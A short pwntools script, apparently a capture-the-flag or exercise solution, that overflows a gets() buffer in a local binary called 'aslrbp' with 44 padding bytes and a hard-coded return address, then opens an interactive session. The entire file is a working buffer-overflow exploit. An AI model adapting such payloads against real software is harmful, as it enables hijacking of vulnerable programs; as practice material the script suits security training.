from pwn import *

#b"A"*44 + p64(1) + p64(0x1000004b8)

p = process(["./aslrbp", "./2"])
payload = b"A"*44 + p64(1) + p64(0x1000004b8)
p.sendlineafter(b"warning: this program uses gets(), which is unsafe.\n", payload)

p.interactive()
